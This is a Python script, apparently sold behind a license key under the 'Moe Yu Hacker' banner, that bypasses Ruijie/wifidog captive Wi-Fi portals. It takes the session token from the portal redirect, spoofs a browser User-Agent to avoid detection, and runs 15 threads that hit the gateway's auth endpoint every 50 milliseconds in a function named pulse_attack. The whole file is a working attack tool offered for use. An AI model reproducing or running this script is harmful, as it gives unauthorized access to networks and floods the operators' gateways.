import requests
import re
import urllib3
import time
import threading
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
PING_THREADS = 15

# COLORS FOR TERMINAL
G = "\033[92m" # Green
R = "\033[91m" # Red
C = "\033[96m" # Cyan
Y = "\033[93m" # Yellow
W = "\033[0m"  # White/Reset

# LOGO & BANNER
BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Ruijie Multi-Bypass )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/bold #00FF00]
"""

# ===============================
# SECURITY SYSTEM (HWID & KEY)
# ===============================

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[white]YOUR HWID: [yellow]{my_hwid}[/yellow][/white]", title=f"[bold red]SECURITY[/]", border_style="cyan", expand=False)))
    
    try:
        user_key = input(f"\n  {W}[ACCESS_KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> AUTHENTICATING... ACCESS GRANTED!{W}")
            return True
        else:
            console.print(f"{R}❌ INVALID KEY!{W}")
            sys.exit()
    except:
        console.print(f"{R}📡 CONNECTION ERROR!{W}")
        sys.exit()

# ===============================
# CORE BYPASS ENGINE
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU UNIVERSAL BYPASS ACTIVATED 🔥[/bold white]"), border_style="red", expand=False))
    
    session = requests.Session()
    # Ruijie က Script လို့ မသိအောင် Chrome Header အပြည့်အစုံသုံးသည်
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })

    while True:
        try:
            # Check Connection
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204:
                sys.stdout.write(f"\r{G}[+] Status: Connected & Online. Monitoring...{W}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # If trapped in Portal
            portal_url = check.url
            query = parse_qs(urlparse(portal_url).query)
            
            # ပုံထဲက chap_challenge (token အသစ်) ကို ဖတ်ခြင်း
            sid = (query.get('chap_challenge', [None])[0] or 
                   query.get('sessionId', [None])[0] or 
                   query.get('token', [None])[0])
            
            # Gateway IP ကို Dynamic ရှာဖွေခြင်း
            gw_ip = query.get('gw_address', [None])[0] or urlparse(portal_url).netloc.split(':')[0]
            gw_port = query.get('gw_port', ['2060'])[0]

            if sid and gw_ip:
                # Wifidog Auth Link
                auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                
                def pulse_attack():
                    while True:
                        try:
                            # Server ဆီ High-frequency Pulse ပို့ခြင်း
                            session.get(auth_link, timeout=5)
                            # Formatting ပြင်ဆင်ထားသော Live Status
                            sys.stdout.write(f"\r{C}[✓] Pulse Active | Gateway: {gw_ip} | Token Captured{W}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.05) 

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_attack, daemon=True).start()
                
                # အင်တာနက်ရမရ စစ်ဆေးခြင်း
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(10)
                        else: break
                    except: break
            else:
                console.print(f"{R}[×] Failed to Capture Token. Please open Login Page first.{W}")
                time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        console.print(f"\n{R}[!] Stopped.{W}")
        sys.exit()
